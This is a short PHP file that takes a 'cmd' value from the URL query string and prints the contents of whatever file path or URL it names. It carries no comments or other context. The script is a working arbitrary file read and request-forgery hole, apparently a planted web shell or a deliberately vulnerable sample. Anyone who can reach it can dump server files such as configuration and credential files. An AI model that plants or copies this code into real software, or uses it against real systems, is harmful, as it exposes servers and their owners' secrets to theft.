<?php
error_reporting(7);
$cmd = $_GET['cmd'];
echo file_get_contents($cmd);
?>